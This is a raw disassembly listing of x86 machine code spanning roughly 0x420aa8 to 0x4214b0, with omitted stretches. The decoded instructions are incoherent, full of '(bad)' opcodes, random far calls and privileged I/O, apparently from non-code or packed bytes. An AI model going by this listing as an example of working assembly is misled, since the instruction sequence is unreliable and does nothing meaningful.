  420aa8:	add    DWORD PTR [eax],eax
  420aaa:	pop    es
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    BYTE PTR [ebp+0x3d4d1df9],dh
  420ab3:	scas   eax,DWORD PTR es:[edi]
  420ab4:	pop    es
  420ab5:	and    DWORD PTR [ebx+0x40],ecx
  420ab8:	jne    0x420ada
  420aba:	imul   ebx,eax,0xb1d8622
  420ac0:	pop    edx
  420ac1:	iret   
  420ac2:	push   edi
  420ac3:	int3   
  420ac4:	sub    eax,0xeaf3449f
  420ac9:	dec    ecx
  420aca:	jg     0x420b11
  420acc:	fsubrp st(3),st
  420ace:	add    DWORD PTR [ecx+0x398a740],ebp
  420ad4:	enter  0x6aad,0x26
  420ad8:	daa    
  420ad9:	add    dl,BYTE PTR [ebp+0x184cb3dd]
  420adf:	cdq    
  420ae0:	cmp    al,0x21
  420ae2:	fwait
  420ae3:	outs   dx,DWORD PTR ds:[esi]
  420ae4:	arpl   cx,dx
  420ae6:	enter  0xf51b,0xd3
  420aea:	(bad)  
  420aeb:	aaa    
  420aec:	xor    ecx,eax
  420aee:	call   0x8305:0xe221646d
  420af5:	mov    bh,0xed
  420af7:	stos   DWORD PTR es:[edi],eax
  420af8:	jl     0x420b0b
  420afa:	push   0x329c4129
  420aff:	ins    DWORD PTR es:[edi],dx
  420b00:	xchg   BYTE PTR [eax+0x28a36c05],bl
  420b06:	cmp    DWORD PTR [ebx+ebx*8-0x104a9e0c],ebp
  420b0d:	xor    al,0xd7
  420b0f:	pop    ss
  420b10:	sub    al,al
  420b12:	sub    al,0xa2
  420b14:	out    0xcb,eax
  420b16:	stos   DWORD PTR es:[edi],eax
  420b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b18:	xchg   BYTE PTR [ebx-0x67],dh
  420b1b:	jle    0x420ade
  420b1d:	lods   eax,DWORD PTR ds:[esi]
  420b1e:	mov    eax,ds:0x9ffe3867
  420b23:	mov    dh,0xe1
  420b25:	data16 adc al,0x39
  420b28:	mov    ebp,0x64dd6324
  420b2d:	cmp    ecx,DWORD PTR [edx]
  420b2f:	loope  0x420b52
  420b31:	mov    ebp,0x341826e6
  420b36:	pop    edx
  420b37:	stos   DWORD PTR es:[edi],eax
  420b38:	cwde   
  420b39:	dec    esi
  420b3a:	mov    ebx,0xc19c9db1
  420b3f:	sbb    DWORD PTR [edx],ebx
  420b41:	push   cs
  420b42:	lds    ebx,FWORD PTR [edi+0x75]
  420b45:	das    
  420b46:	inc    ebx
  420b47:	(bad)
  420b4b:	and    DWORD PTR [edi],edx
  420b4d:	daa    
  420b4e:	out    dx,eax
  420b4f:	push   es
  420b50:	add    al,0xc9
  420b52:	arpl   dx,ax
  420b54:	ret    
  420b55:	in     eax,dx
  420b56:	sahf   
  420b57:	fcom   DWORD PTR [ecx+0x36caec97]
  420b5d:	sub    al,0x19
  420b5f:	frstor [edi]
  420b61:	pusha  
  420b62:	mov    edx,0xaf5298c6
  420b67:	and    al,0x37
  420b69:	mov    ecx,0xa52ae22b
  420b6e:	cmp    bh,BYTE PTR [ebp+0x4b]
  420b71:	adc    DWORD PTR [edi],ebp
  420b73:	nop
  420b74:	and    BYTE PTR [eax-0x6c],bl
  420b77:	hlt    
  420b78:	call   0x62b3:0x8a5a1c27
  420b7f:	adc    edi,DWORD PTR [ebp-0x7bcdc9cb]
  420b85:	push   esi
  420b86:	(bad)  
  420b87:	(bad)  [ecx-0x332b0c43]
  420b8d:	cwde   
  420b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b8f:	fcmovnbe st,st(1)
  420b91:	adc    DWORD PTR [esp+ecx*1],esi
  420b94:	push   eax
  420b95:	jp     0x420bd2
  420b97:	shl    BYTE PTR [ebp-0x1197ab5d],cl
  420b9d:	mov    eax,ds:0x9c787483
  420ba2:	fstp   TBYTE PTR [esi]
  420ba4:	add    edx,edi
  420ba6:	in     al,dx
  420ba7:	push   0xffffff9f
  420ba9:	inc    edi
  420baa:	mov    ecx,0x76a637e8
  420baf:	mov    esi,0x14bc0ac8
  420bb4:	loopne 0x420bb6
	...
  420c16:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c1c:	mov    edx,0x5a65553f
  420c21:	stc    
  420c22:	imul   esp,DWORD PTR [esi+0x5bac0a19],0x1070001
  420c2c:	add    BYTE PTR [eax],al
  420c2e:	out    0xee,al
  420c30:	or     ah,BYTE PTR [ecx-0x17]
  420c33:	call   0x73490eaf
  420c38:	out    dx,eax
  420c39:	jmp    0x373d:0x98385611
  420c40:	jbe    0x420be2
  420c42:	push   ebx
  420c43:	sbb    esp,DWORD PTR [eax+ecx*4+0x4]
  420c47:	or     BYTE PTR [eax+0x58f588ae],cl
  420c4d:	xchg   ebp,eax
  420c4e:	mov    ds:0xff3ac538,eax
  420c53:	add    eax,0xabff9b34
  420c58:	ficom  WORD PTR [esp-0x68ba1780]
  420c5f:	sub    al,BYTE PTR [eax-0x48]
  420c62:	mov    cl,0x10
  420c64:	shl    BYTE PTR [esi-0x57],1
  420c67:	ins    DWORD PTR es:[edi],dx
  420c68:	xchg   esp,eax
  420c69:	fwait
  420c6a:	call   0xe6ac:0xeb9d150f
  420c71:	fwait
  420c72:	lea    eax,[ebp-0x1cb091d]
  420c78:	repnz mov DWORD PTR [ebp-0x446aba09],ebx
  420c7f:	or     eax,0x2a0b1f9
  420c84:	xchg   esp,eax
  420c85:	int3   
  420c86:	jnp    0x420c4f
  420c88:	add    al,0xe2
  420c8a:	inc    esi
  420c8b:	mov    edx,0x972ce8f0
  420c90:	aas    
  420c91:	dec    ebp
  420c92:	rcl    DWORD PTR [edi-0x6c],0x27
  420c96:	sbb    eax,0xb62b7701
  420c9b:	dec    edi
  420c9c:	jmp    0x61b5cf77
  420ca1:	mov    ds:0x21d6c51e,al
  420ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ca7:	stos   DWORD PTR es:[edi],eax
  420ca8:	mov    ss,WORD PTR [esp+ecx*4-0xd83030a]
  420caf:	stos   BYTE PTR es:[edi],al
  420cb0:	je     0x420d08
  420cb2:	xor    eax,0x7b69ce80
  420cb7:	xchg   esi,eax
  420cb8:	cld    
  420cb9:	test   BYTE PTR [edx+0x2],ah
  420cbc:	rcr    DWORD PTR [ecx-0x1c],0xec
  420cc0:	push   eax
  420cc1:	mov    esp,0xf22249d7
  420cc6:	leave  
  420cc7:	sbb    eax,0x508f90fa
  420ccc:	cmc    
  420ccd:	fcmovbe st,st(2)
  420ccf:	xchg   ebp,eax
  420cd0:	in     al,0xea
  420cd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420cd3:	jmp    0x9f2bc572
  420cd8:	bound  eax,QWORD PTR [bx+si-0x32]
  420cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cdd:	pop    ecx
  420cde:	mov    edx,0x9e11f8cc
  420ce3:	xchg   ecx,eax
  420ce4:	pop    ss
  420ce5:	retf   0x3f19
  420ce8:	jge    0x420d28
  420cea:	mov    edx,eax
  420cec:	ret    0xc4dd
  420cef:	out    0xf0,al
  420cf1:	push   edi
  420cf2:	aas    
  420cf3:	popa   
  420cf4:	xor    al,0x58
  420cf6:	retf   0x7763
  420cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cfa:	xchg   BYTE PTR [ebp+0x43],ah
  420cfd:	cmp    esp,DWORD PTR [edi]
  420cff:	loopne 0x420d77
  420d01:	mov    ebx,0x6bbc91ab
  420d06:	outs   dx,BYTE PTR ds:[esi]
  420d08:	mov    bl,0xc4
  420d0a:	push   eax
  420d0b:	xor    edx,DWORD PTR [ebx+0x3d]
  420d0e:	psubusb mm1,QWORD PTR [eax-0x46]
  420d12:	sti    
  420d13:	jbe    0x420cd3
  420d15:	jnp    0x420d2c
  420d17:	adc    DWORD PTR [edx-0x777e83ef],ebx
  420d1d:	pop    ss
  420d1e:	call   0xcfc8:0xca35ecfc
  420d25:	push   es
  420d26:	aad    0x7f
  420d28:	lds    esp,FWORD PTR [ebx]
  420d2a:	test   al,0xab
  420d2c:	cmp    eax,0x737f4db2
  420d31:	mov    WORD PTR [esp+ebx*2],?
  420d34:	mov    ebp,0x0
	...
  420d95:	add    bh,ah
  420d97:	push   ds
  420d98:	into   
  420d99:	push   0x9fe7f8ff
  420d9e:	mov    edi,0x580c1cea
  420da3:	out    dx,al
  420da4:	jne    0x420d92
  420da6:	mov    bl,0x5c
  420da8:	add    DWORD PTR [eax],eax
  420daa:	pop    es
  420dab:	add    DWORD PTR [eax],eax
  420dad:	add    BYTE PTR [ecx-0x45db98c],cl
  420db3:	and    BYTE PTR [edi-0x4d],al
  420db6:	adc    edi,DWORD PTR [edx-0xa87189e]
  420dbc:	stos   DWORD PTR es:[edi],eax
  420dbd:	out    0x79,al
  420dbf:	push   esp
  420dc0:	test   BYTE PTR [ebx],dl
  420dc2:	xor    dh,BYTE PTR [edx+0x4d134306]
  420dc8:	sbb    al,0xd5
  420dca:	icebp  
  420dcb:	push   ss
  420dcc:	and    eax,0xcc97445d
  420dd1:	mov    dh,0xc8
  420dd3:	imul   ebp,ebx,0xffffffb2
  420dd6:	jle    0x420d75
  420dd8:	or     dl,BYTE PTR [edx]
  420dda:	icebp  
  420ddb:	test   eax,eax
  420ddd:	rol    DWORD PTR [ebx-0x60ea905f],0x84
  420de4:	pop    es
  420de5:	sar    BYTE PTR [ebx-0x7bbae8f0],0x90
  420dec:	popa   
  420ded:	sbb    DWORD PTR [ecx+edi*2],ecx
  420df0:	adc    eax,DWORD PTR [di]
  420df3:	xchg   ebp,eax
  420df4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420df5:	and    ch,0x91
  420df8:	cmc    
  420df9:	jmp    0x420d7f
  420dfb:	mov    DWORD PTR [ebx],esp
  420dfd:	(bad)  
  420dfe:	push   ss
  420dff:	jmp    0x420dc0
  420e01:	xchg   bl,al
  420e03:	cmp    ecx,DWORD PTR [ecx]
  420e05:	adc    eax,0xf6806c9e
  420e0a:	test   BYTE PTR [esi-0x50a02a3],0xb8
  420e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e12:	mov    ebx,0x1d0a5623
  420e17:	cmp    bh,ah
  420e19:	loop   0x420e2d
  420e1b:	loopne 0x420e4a
  420e1d:	mov    bh,0x98
  420e1f:	in     eax,dx
  420e20:	jae    0x420e2c
  420e22:	pop    es
  420e23:	pop    es
  420e24:	push   esp
  420e25:	out    0x26,eax
  420e27:	pop    esp
  420e28:	ds (bad) 
  420e2a:	aam    0xd
  420e2c:	fwait
  420e2d:	out    0xe8,eax
  420e2f:	dec    ebx
  420e30:	test   al,0x2
  420e32:	inc    ecx
  420e33:	hlt    
  420e34:	add    ecx,DWORD PTR [ecx+0x77761dfc]
  420e3a:	ficom  WORD PTR [edi-0x3e502bd5]
  420e40:	sti    
  420e41:	xor    dh,BYTE PTR [edi-0x4]
  420e44:	mov    cl,0x56
  420e46:	mov    eax,ds:0x91389484
  420e4b:	inc    esp
  420e4c:	daa    
  420e4d:	cli    
  420e4e:	sbb    bl,BYTE PTR [esp+edx*4]
  420e51:	or     al,0x1d
  420e53:	and    BYTE PTR [eax+0x5f],bh
  420e56:	fwait
  420e57:	push   edx
  420e58:	lods   eax,DWORD PTR ds:[esi]
  420e5a:	adc    DWORD PTR [esi],ebp
  420e5c:	arpl   sp,si
  420e5e:	or     al,0x4e
  420e60:	das    
  420e61:	jno    0x420e3b
  420e63:	jle    0x420ece
  420e65:	mov    ebp,0x7d9ff5fd
  420e6a:	and    al,0x94
  420e6c:	aad    0xc9
  420e6e:	mov    al,ds:0x1abcb906
  420e73:	std    
  420e74:	pushf  
  420e75:	rol    BYTE PTR [ebx+eiz*4+0x6d929257],0xc8
  420e7d:	test   cl,bl
  420e7f:	adc    ecx,0xffffffa9
  420e82:	scas   al,BYTE PTR es:[edi]
  420e83:	cmp    al,0x58
  420e85:	call   0x3deb:0xd2ee9c06
  420e8c:	xor    al,BYTE PTR [eax+0x73]
  420e8f:	jns    0x420e13
  420e91:	or     bl,BYTE PTR [esi+0x37]
  420e94:	push   esp
  420e95:	mov    cl,0xfd
  420e97:	jmp    0x420eaf
  420e99:	adc    BYTE PTR [eax],dh
  420e9b:	rol    BYTE PTR [edi-0x5ace73fa],cl
  420ea1:	jno    0x420efe
  420ea3:	mov    al,0x31
  420ea5:	pop    ecx
  420ea6:	lahf   
  420ea7:	out    0xa4,eax
  420ea9:	inc    edx
  420eaa:	push   ecx
  420eab:	sub    ah,dl
  420ead:	inc    esp
  420eae:	pop    esi
  420eaf:	push   edx
  420eb0:	push   edi
  420eb1:	out    0x4b,al
  420eb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420eb4:	lea    eax,[eax]
	...
  420f16:	and    BYTE PTR [edi-0x28082cbe],dl
  420f1c:	mov    cl,0xf7
  420f1e:	sub    ch,0x3e
  420f21:	ds fisubr WORD PTR gs:[eax]
  420f25:	mov    DWORD PTR [edx+0x700015d],edi
  420f2b:	add    DWORD PTR [eax],eax
  420f2d:	add    BYTE PTR [ebx-0x1b],bh
  420f30:	xor    DWORD PTR [ecx],edx
  420f32:	and    BYTE PTR [ebx-0x6b342b60],dl
  420f38:	pop    ds
  420f39:	leave  
  420f3a:	fmul   st,st(3)
  420f3c:	loopne 0x420f90
  420f3e:	xor    ecx,DWORD PTR [ebp+0x17]
  420f41:	ja     0x420fbb
  420f43:	cmp    eax,0x8cda7050
  420f48:	adc    al,0x52
  420f4a:	lahf   
  420f4b:	cmp    al,cl
  420f4d:	cmp    al,0xe8
  420f4f:	sub    ebp,edi
  420f51:	jbe    0x420f81
  420f53:	out    dx,eax
  420f54:	aaa    
  420f55:	or     eax,0x65f5793
  420f5a:	nop
  420f5b:	sub    ecx,esp
  420f5d:	cmp    al,0x78
  420f5f:	popf   
  420f60:	adc    eax,0xf83e53d5
  420f65:	je     0x420f04
  420f67:	sbb    ch,bl
  420f69:	mov    ds:0x1190e000,eax
  420f6e:	test   eax,0x5bb5915d
  420f73:	cmp    edx,edx
  420f75:	mov    eax,ds:0xf4b3266a
  420f7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f7b:	cmc    
  420f7c:	lods   al,BYTE PTR ds:[esi]
  420f7d:	iret   
  420f7e:	stc    
  420f7f:	add    DWORD PTR [esi],ebp
  420f81:	lds    ebp,FWORD PTR [edi+ebp*4+0x1f754a21]
  420f88:	xor    BYTE PTR [eax+0xb],bl
  420f8b:	mov    dh,bh
  420f8d:	fdivr  QWORD PTR [ecx]
  420f8f:	lds    ebp,FWORD PTR [eax]
  420f91:	into   
  420f92:	out    0x89,eax
  420f94:	retf   0x9f5a
  420f97:	mov    DWORD PTR ss:[ebp+0xeba7890],ebx
  420f9e:	(bad)  
  420f9f:	pop    edi
  420fa0:	dec    eax
  420fa1:	push   eax
  420fa2:	mov    ebx,0x41658cd3
  420fa7:	xor    ebx,DWORD PTR [ebx+0x59]
  420faa:	mov    ch,0x83
  420fac:	add    al,0xb0
  420fae:	lock jnp 0x420f47
  420fb1:	mov    bl,0x1b
  420fb3:	ret    0x95f4
  420fb6:	inc    ebp
  420fb7:	inc    ebx
  420fb8:	jecxz  0x420f8a
  420fba:	push   cs
  420fbb:	jge    0x420fec
  420fbd:	les    ebx,FWORD PTR [eax-0x5d]
  420fc0:	push   0x34
  420fc2:	sahf   
  420fc3:	in     al,0x67
  420fc5:	inc    eax
  420fc6:	jmp    0x1480:0xf7217218
  420fcd:	dec    edi
  420fce:	sub    BYTE PTR [eax-0x9],0xd4
  420fd2:	aas    
  420fd3:	in     eax,0x6f
  420fd5:	outs   dx,DWORD PTR ds:[esi]
  420fd6:	ins    DWORD PTR es:[edi],dx
  420fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fd8:	xor    ch,cl
  420fda:	mov    edx,0x96b75ea4
  420fdf:	fs mov esi,0xf42a0c21
  420fe5:	inc    ebx
  420fe6:	jo     0x420fef
  420fe8:	inc    ecx
  420fe9:	pusha  
  420fea:	daa    
  420feb:	paddusb mm7,QWORD PTR [edi-0x2c]
  420fef:	cwde   
  420ff0:	push   es
  420ff1:	int    0x21
  420ff3:	mov    ds:0x12db2987,eax
  420ff8:	mov    eax,eax
  420ffa:	jecxz  0x420fbb
  420ffc:	sbb    al,0xde
  420ffe:	lods   al,BYTE PTR ds:[esi]
  420fff:	xor    BYTE PTR [esp+ebx*1],ch
  421002:	dec    edi
  421003:	pop    es
  421004:	push   ss
  421005:	(bad)  [edi+0x2f72c9a6]
  42100b:	sahf   
  42100c:	stos   DWORD PTR es:[edi],eax
  42100d:	idiv   BYTE PTR [edi+ebp*4+0x7e]
  421011:	daa    
  421012:	sar    DWORD PTR [ebx],0x3
  421015:	outs   dx,DWORD PTR ds:[esi]
  421016:	jae    0x421090
  421018:	push   ebp
  421019:	hlt    
  42101a:	push   0x79
  42101c:	add    esp,edi
  42101e:	shl    DWORD PTR [esi+ebp*1],1
  421021:	aad    0x22
  421023:	xor    esp,DWORD PTR [esi]
  421025:	lods   al,BYTE PTR ds:[esi]
  421026:	test   al,0xdc
  421028:	cmp    esi,DWORD PTR [ebp+0x33]
  42102b:	sub    esp,DWORD PTR [esi+edi*2+0x3b]
  42102f:	(bad)  
  421030:	lea    edi,[eax+0xbcf86]
	...
  421096:	lahf   
  421097:	pop    esi
  421098:	fcmovb st,st(6)
  42109a:	fcmovnb st,st(6)
  42109c:	lahf   
  42109d:	pop    edi
  42109e:	retf   
  42109f:	inc    esi
  4210a0:	and    eax,0x4f4dd0fe
  4210a5:	sub    eax,ecx
  4210a7:	pop    esi
  4210a8:	add    DWORD PTR [eax],eax
  4210aa:	pop    es
  4210ab:	add    DWORD PTR [eax],eax
  4210ad:	add    BYTE PTR [ecx-0x2c],ah
  4210b0:	loope  0x4210df
  4210b2:	sbb    ecx,DWORD PTR [ebx-0xd]
  4210b5:	mov    bh,0x26
  4210b7:	in     eax,dx
  4210b8:	inc    eax
  4210b9:	mov    WORD PTR [ebx+0x37592edc],ds
  4210bf:	push   ebx
  4210c0:	or     eax,DWORD PTR [eax-0x19]
  4210c3:	mov    BYTE PTR [eax+ebx*8],bl
  4210c6:	jmp    0xe5014d66
  4210cb:	loopne 0x4210ee
  4210cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210ce:	fimul  DWORD PTR [ebp-0x59]
  4210d1:	into   
  4210d2:	lahf   
  4210d3:	pop    esi
  4210d4:	push   ecx
  4210d5:	fbld   TBYTE PTR [edi-0x3c]
  4210d8:	cli    
  4210d9:	repnz cmp esp,0xafceaa36
  4210e0:	jg     0x4210aa
  4210e2:	mov    WORD PTR [ebp+0x2a820fe9],fs
  4210e8:	bound  esi,QWORD PTR [ecx]
  4210ea:	ret    
  4210eb:	sub    ebp,DWORD PTR [ebp-0x6]
  4210ee:	jno    0x4210ae
  4210f0:	cwde   
  4210f1:	in     al,dx
  4210f2:	loopne 0x42109b
  4210f4:	mov    edi,0x4f2477ef
  4210f9:	jl     0x4210cb
  4210fb:	cmc    
  4210fc:	stc    
  4210fd:	and    edi,DWORD PTR [ebx]
  4210ff:	xchg   ebp,eax
  421100:	adc    ah,al
  421102:	inc    ebp
  421103:	cdq    
  421104:	and    ch,BYTE PTR [edx+0x6be3676c]
  42110a:	daa    
  42110b:	fistp  WORD PTR [edx-0xb3ad20b]
  421111:	pop    ecx
  421112:	sbb    eax,0x6912de3e
  421117:	mov    WORD PTR cs:0x96296a4f,?
  42111e:	cmp    DWORD PTR [esi+0x31100780],ebx
  421124:	push   ebx
  421125:	and    al,0x7f
  421127:	adc    BYTE PTR [ebx-0x291751a4],0x9e
  42112e:	clc    
  42112f:	or     BYTE PTR [edx-0x1b],ah
  421132:	push   es
  421133:	sbb    dl,ch
  421135:	sbb    ch,dh
  421137:	push   0x8cb3f702
  42113c:	repnz sbb BYTE PTR [ecx-0x945abb2],ch
  421143:	mov    al,ds:0x32d7385a
  421148:	popa   
  421149:	and    BYTE PTR [ecx-0x39fd4c56],0xec
  421150:	mov    ss,WORD PTR ds:0x6a994900
  421156:	xlat   BYTE PTR ds:[ebx]
  421157:	push   esi
  421158:	pusha  
  421159:	ja     0x421130
  42115b:	jp     0x4210f1
  42115d:	loop   0x42112c
  42115f:	stc    
  421160:	adc    al,0x22
  421162:	in     eax,dx
  421163:	aam    0x31
  421165:	out    dx,eax
  421166:	push   ss
  421167:	push   ebp
  421168:	rcl    DWORD PTR [esi+esi*8-0x3ee7a5b7],0x6f
  421170:	sar    BYTE PTR [ebp-0x16],cl
  421173:	push   ebx
  421174:	adc    eax,0x57f6fff5
  421179:	enter  0x6a6b,0x3a
  42117d:	nop
  42117e:	stos   BYTE PTR es:[edi],al
  42117f:	jmp    0x421125
  421181:	inc    edx
  421182:	sbb    dh,BYTE PTR [edx+0x6b]
  421185:	sar    DWORD PTR [ebp-0x1a4c72c1],1
  42118b:	mov    esi,0xe0a878a2
  421190:	pop    esp
  421191:	not    DWORD PTR [ebp+0x61]
  421194:	or     al,0x63
  421196:	jne    0x421170
  421198:	pop    ebp
  421199:	inc    eax
  42119a:	int3   
  42119b:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42119d:	and    eax,0xc188fffa
  4211a2:	jb     0x42118e
  4211a4:	mov    eax,0xf81ccac1
  4211a9:	call   0xbd0778e3
  4211ae:	shl    DWORD PTR [eax],1
  4211b0:	or     ecx,DWORD PTR [ebx+0x46ca57]
	...
  421216:	sahf   
  421217:	pop    ds
  421218:	(bad)  
  421219:	test   DWORD PTR [edi+0x617ffef7],0x7a492007
  421223:	cdq    
  421224:	mov    bl,0x54
  421226:	enter  0x15f,0x0
  42122a:	pop    es
  42122b:	add    DWORD PTR [eax],eax
  42122d:	add    bh,cl
  42122f:	add    dl,BYTE PTR [ebp-0x68693518]
  421235:	jno    0x421296
  421237:	mov    esp,0x8b28b79d
  42123c:	out    dx,al
  42123d:	in     al,0x7c
  42123f:	or     eax,0x60a00a3b
  421244:	add    al,0x40
  421246:	add    BYTE PTR [eax+0x43f45ebf],ah
  42124c:	pop    eax
  42124d:	dec    edx
  42124e:	adc    DWORD PTR [edx+0x22],eax
  421251:	dec    ebp
  421252:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421253:	in     al,0x3
  421255:	in     al,dx
  421256:	and    ebp,DWORD PTR [ebx+esi*4+0x5f6afb33]
  42125d:	sbb    DWORD PTR [esi-0x78],esp
  421260:	hlt    
  421261:	scas   eax,DWORD PTR es:[edi]
  421262:	jbe    0x421226
  421264:	and    al,0x2b
  421266:	in     eax,0xfd
  421268:	xlat   BYTE PTR ds:[ebx]
  42126a:	adc    esp,edx
  42126c:	xor    eax,0x58ffd5be
  421271:	push   0x9ede97e
  421276:	lock lods eax,DWORD PTR ds:[esi]
  421278:	pop    eax
  421279:	out    dx,al
  42127a:	sub    eax,0x977ef016
  42127f:	and    DWORD PTR [ecx+0x44884f1c],edx
  421285:	mov    eax,ds:0x7a265835
  42128a:	xor    BYTE PTR [ebp+0x44a1629a],bh
  421290:	xchg   ebx,eax
  421291:	or     edi,DWORD PTR [edi+ecx*1+0x13a3617e]
  421298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421299:	xchg   edx,eax
  42129a:	push   edi
  42129b:	ds shl BYTE PTR es:[esp+ebp*8-0x5a],cl
  4212a1:	sub    eax,0x5bc1f53e
  4212a6:	daa    
  4212a7:	and    BYTE PTR [ebx-0x24],cl
  4212aa:	lea    esp,[eax+0x2]
  4212ad:	add    ebx,DWORD PTR [esi-0xe1980e6]
  4212b3:	call   0x17bfaefb
  4212b8:	fldenv [ebp-0x33]
  4212bb:	sub    esp,edx
  4212bd:	mov    ebx,0x92c83619
  4212c2:	or     al,0x69
  4212c4:	xchg   esi,eax
  4212c5:	stos   BYTE PTR es:[edi],al
  4212c6:	ja     0x421291
  4212c8:	sbb    DWORD PTR [edi+0x542db518],ebp
  4212ce:	jae    0x42130e
  4212d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212d1:	test   DWORD PTR [ecx-0x40],eax
  4212d4:	or     DWORD PTR [esi+0x4f],esi
  4212d7:	adc    eax,0xa3f06d13
  4212dc:	fst    DWORD PTR [edi]
  4212de:	cmp    bh,dl
  4212e0:	adc    DWORD PTR [edi+0x60b20c5],edi
  4212e6:	lds    esp,FWORD PTR [edi]
  4212e8:	jo     0x421331
  4212ea:	repz xlat BYTE PTR ds:[ebx]
  4212ec:	(bad)  
  4212ed:	pop    edx
  4212ee:	jg     0x4212c0
  4212f0:	inc    ecx
  4212f1:	xchg   edi,eax
  4212f2:	ret    
  4212f3:	sti    
  4212f4:	xchg   edi,eax
  4212f5:	or     esi,DWORD PTR [ebx+0x2e]
  4212f8:	add    DWORD PTR [edi+0xf],0x4e04ef46
  4212ff:	out    0xac,al
  421301:	cs aam 0x76
  421304:	push   ebx
  421305:	xchg   edx,eax
  421306:	sub    DWORD PTR [esi],ecx
  421308:	push   eax
  421309:	and    ebx,DWORD PTR [eax+0x39]
  42130c:	and    dh,al
  42130e:	test   eax,0x7beb0265
  421313:	cmp    BYTE PTR [ebp+0x77955853],0x84
  42131a:	ins    DWORD PTR es:[edi],dx
  42131b:	sbb    edx,eax
  42131d:	add    al,al
  42131f:	cmp    al,0xc7
  421321:	mov    esp,DWORD PTR ds:0x8fd670da
  421327:	outs   dx,BYTE PTR ds:[esi]
  421328:	or     ebx,ecx
  42132a:	cdq    
  42132b:	dec    esi
  42132c:	(bad)  
  42132d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42132e:	jns    0x42136a
  421330:	bndldx (bad),[ebx+0x8]
  421334:	cwde   
	...
  421395:	add    dh,bh
  421397:	(bad)  
  421398:	pop    esp
  421399:	mov    eax,ds:0xdfffbb7d
  42139e:	mov    eax,ds:0x596c04b0
  4213a3:	or     al,0xb6
  4213a5:	mov    ebx,0x160cf
  4213aa:	pop    es
  4213ab:	add    DWORD PTR [eax],eax
  4213ad:	add    BYTE PTR [eax],bh
  4213af:	std    
  4213b0:	mov    ds:0xb8b94507,eax
  4213b5:	cmp    BYTE PTR [edx-0xd6825b],bh
  4213bb:	mov    dl,0x1c
  4213bd:	adc    DWORD PTR [ecx+esi*8-0x1ad3f036],ecx
  4213c4:	mov    ecx,0x16388444
  4213c9:	jmp    0xcc384ffa
  4213ce:	outs   dx,BYTE PTR ds:[esi]
  4213cf:	mov    ecx,0xca8e849c
  4213d4:	and    esp,edi
  4213d6:	sub    eax,0x7bc3e419
  4213db:	jmp    0x6439c230
  4213e0:	rol    esi,cl
  4213e2:	or     al,0xc3
  4213e4:	pop    ebx
  4213e5:	int3   
  4213e6:	ja     0x421385
  4213e8:	or     ecx,DWORD PTR [ebx-0x32]
  4213eb:	popa   
  4213ec:	fldenv [eax]
  4213ee:	jno    0x4213ee
  4213f0:	push   es
  4213f1:	jg     0x4213d5
  4213f3:	std    
  4213f4:	add    al,0x28
  4213f6:	add    al,0xfe
  4213f8:	gs mov cl,0xec
  4213fb:	hlt    
  4213fc:	arpl   WORD PTR [eax-0x55],bp
  4213ff:	xchg   esi,eax
  421400:	es ins DWORD PTR es:[edi],dx
  421402:	imul   ecx,DWORD PTR [ebp+0x73],0xf9a06a8f
  421409:	test   eax,0xa9ad4f51
  42140e:	sub    eax,0x12c5f8a
  421413:	add    BYTE PTR [ebp-0x36b1fde2],dl
  421419:	aaa    
  42141a:	lea    edi,[edi-0x785018a8]
  421420:	stos   DWORD PTR es:[edi],eax
  421421:	das    
  421422:	faddp  st(6),st
  421424:	inc    eax
  421425:	repz aam 0x5b
  421428:	pop    ss
  421429:	icebp  
  42142a:	pop    ecx
  42142b:	fwait
  42142c:	mov    ch,0x69
  42142e:	retf   0xd66
  421431:	sbb    BYTE PTR [eax+0x40c03bb5],bl
  421437:	test   al,0x53
  421439:	push   ecx
  42143a:	sbb    ecx,esp
  42143c:	mov    esi,0xb57f63a1
  421441:	gs out dx,eax
  421443:	sub    dl,bh
  421445:	fldenv [edi]
  421447:	out    0xaa,eax
  421449:	gs push ebx
  42144b:	ret    
  42144c:	cwde   
  42144d:	test   al,0x8f
  42144f:	addr16 and al,ch
  421452:	outs   dx,BYTE PTR ds:[esi]
  421453:	mov    cl,0x38
  421455:	fwait
  421456:	in     eax,0x57
  421458:	and    al,BYTE PTR [ecx-0xd330d3a]
  42145e:	stos   BYTE PTR es:[edi],al
  42145f:	js     0x42140b
  421461:	enter  0x7a3d,0xe3
  421465:	imul   ebx,DWORD PTR cs:[ecx-0x6e],0x33101c5f
  42146d:	push   edx
  42146e:	test   BYTE PTR [edx+0x2bd8667e],ah
  421474:	sub    bh,BYTE PTR [edx-0x3a]
  421477:	cld    
  421478:	jg     0x4214e8
  42147a:	retf   0xaf83
  42147d:	sar    esp,1
  42147f:	retf   
  421480:	scas   eax,DWORD PTR es:[edi]
  421481:	das    
  421482:	xor    BYTE PTR [ebp+0x4b],cl
  421485:	imul   esi,DWORD PTR [esi+0x5d121685],0xffffffcc
  42148c:	icebp  
  42148d:	sub    DWORD PTR [ebx],ebx
  42148f:	jno    0x4214b3
  421491:	and    ch,BYTE PTR [eax-0x38f0d188]
  421497:	push   0x72
  421499:	pushf  
  42149a:	xchg   edx,eax
  42149b:	xchg   edi,eax
  42149c:	mov    ah,0xbe
  42149e:	mov    ds:0x63bdf8ae,al
  4214a3:	sbb    DWORD PTR [esp+eiz*4+0x40],eax
  4214a7:	out    0xbe,eax
  4214a9:	mov    esi,0xc03fa450
  4214ae:	(bad)  
  4214af:	push   ds
  4214b0:	sub    eax,0x907b2028
	...
